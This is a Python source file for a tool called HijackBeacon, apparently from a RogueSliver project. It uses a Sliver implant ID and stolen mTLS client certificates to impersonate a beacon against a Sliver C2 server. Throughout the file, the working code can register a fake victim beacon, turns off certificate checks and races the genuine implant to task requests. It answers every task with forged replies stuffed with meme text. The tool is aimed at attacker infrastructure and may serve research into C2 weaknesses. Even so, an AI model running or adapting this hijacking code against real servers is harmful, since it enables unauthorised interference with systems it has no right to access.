import socket, ssl
import os
from RogueSliver.consts import msgs
import random
import time
import struct
import RogueSliver.sliver_pb2 as sliver
import json
import argparse
import uuid
from google.protobuf import json_format
from rich import print

ssl_ctx = ssl.create_default_context()
ssl_ctx.load_cert_chain(keyfile='certs/client.key',certfile='certs/client.crt')#,ca_certs='sliver/ca.crt')
ssl_ctx.load_verify_locations('certs/ca.crt')
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

beacon_info = {
  "ID": "",
  "Interval": 60000000000,
  "Jitter": 30000000000,
  "NextCheckin": 60,
  "Register": {
    "Name": "A",
    "Hostname": "DESKTOP-1WCP2DC",
    #"Uuid": "4c4c4544-0050-3310-805a-b1c04f363633",
    "Uuid": str(uuid.uuid4()),
    "Username": "DESKTOP-1WCP2DC\\victim",
    "Uid": "S-1-5-21-3040728174-9675054041-1375210577-1001",
    "Gid": "S-1-5-21-3040728174-9675054041-1375210577-1001",
    "Os": "windows",
    "Arch": "amd64",
    "Pid": random.randint(100,10000),
    "Filename": "lol.exe",
    "ActiveC2": "",
    "Version": "10 build 22621 x86_64",
    "ReconnectInterval": 60000000000,
    "ConfigID": str(uuid.uuid4()),
    "PeerID": 6870485369159281105,
    "Locale": "en-US"
  }
}


def get_protobuf_obj(data):
  r_req = getattr(sliver,msgs[data.Type])()
  r_req.ParseFromString(data.Data)
  return r_req

def send_envelope(envelope,ip,port):
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    with ssl_ctx.wrap_socket(s,) as ssock:
      ssock.connect((ip,port))
      data_len = struct.pack('I',len(envelope.SerializeToString()))
      ssock.write(data_len)
      ssock.write(envelope.SerializeToString())

def send_recv_envelope(envelope,ip,port):
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    with ssl_ctx.wrap_socket(s) as ssock:
      ssock.connect((ip,port))
      data_len = struct.pack('I',len(envelope.SerializeToString()))
      ssock.write(data_len)
      ssock.write(envelope.SerializeToString())

      r_len = ssock.recv()
      r_data = ssock.recv(int(r_len[0]))

      r_envelope = sliver.Envelope()
      r_envelope.ParseFromString(r_data)
      return r_envelope

def proto_load_dict(protobuf,d):
  for i, k in enumerate(d):
    if isinstance(d[k],dict):
      proto_load_dict(protobuf,d[k])
    else:
      setattr(protobuf,k,d[k])
  return protobuf

def get_tasks(id,next_checkin,ip,port):
  beacon_tasks = sliver.BeaconTasks()
  beacon_tasks.ID = id
  beacon_tasks.NextCheckin = next_checkin
  envelope=sliver.Envelope()
  envelope.Type = msgs.index('BeaconTasks')
  envelope.Data = beacon_tasks.SerializeToString()
  r = send_recv_envelope(envelope,ip,port)
  r_req = get_protobuf_obj(r)
  return r_req.Tasks

def register_beacon(beacon_info,ip,port):
  print('[yellow]\[i][/yellow] Sending beacon registration.')
  reg = sliver.BeaconRegister()
  json_format.Parse(json.dumps(beacon_info),reg)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('BeaconRegister')
  envelope.Data = reg.SerializeToString()
  send_envelope(envelope,ip,port)
  time.sleep(1)

def wrap_envelope(data,type):
  envelope = sliver.Envelope()
  envelope.Type = msgs.index(type)
  envelope.Data = data.SerializeToString()
  return envelope

def send_tasks(id,tasks,ip,port):
  print('[green]\[+][/green] Sending tasks:')
  for task in tasks:
    print(msgs[task.Type])
  beacon_tasks = sliver.BeaconTasks()
  beacon_tasks.Tasks.extend(tasks)
  beacon_tasks.ID = id
  beacon_tasks.NextCheckin = 65
  #envelope = wrap_envelope(beacon_tasks, 'BeaconTasks')
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('BeaconTasks')
  envelope.Data = beacon_tasks.SerializeToString()
  send_envelope(envelope,ip,port)


description = '''
HijackBeacon takes a Sliver implant ID and a mtls certificate and uses them to interact
with a Sliver C2 server.
'''

def cmdline_args():
  p = argparse.ArgumentParser(prog='HijackBeacon', description=description,
      formatter_class=argparse.RawDescriptionHelpFormatter)
  
  p.add_argument("id",
                 help="The implant UUID. This can be obtained with ExtractCerts.py.")
  p.add_argument("ip", type=str,
                 help="The target C2 server IP.")
  p.add_argument("port", type=int,
                 help="The target C2 server port.")
  p.add_argument("-i", type=int,
                 help="The interval to request tasks.",default=1)
  p.add_argument("-r",
                 help="Send a registration packet. If a beacon doesn't exist, this will register a new beacon the attacker can interact with.",default=False,action='store_true')
  return(p.parse_args())



if __name__ == '__main__':
  args = cmdline_args()
  beacon_info["ID"] = args.id

  if(args.r):
    register_beacon(beacon_info,args.ip,args.port)
  
  while True:
    for task in get_tasks(args.id,args.i,args.ip,args.port):

      print('[green]\[+][/green] Received task:')
      print(msgs[task.Type])
      print(get_protobuf_obj(task))
      # You can return any task type for any task request. We just need to beat the "legitimate" beacon to the request.
      # Respond to everything with pwd object since it takes a simple string and shows up for most tasks.
      pwd = sliver.Pwd()
      memes = os.listdir('memes')
      meme = random.choice(memes)
      with open('memes/'+meme,encoding='utf-8') as f:
        pwd.Path = f.read()

      task_envelope = wrap_envelope(pwd, 'Pwd')

      #just one task at a time right now - need to add more
      send_tasks(args.id,[task_envelope],args.ip,args.port)

    time.sleep(args.i)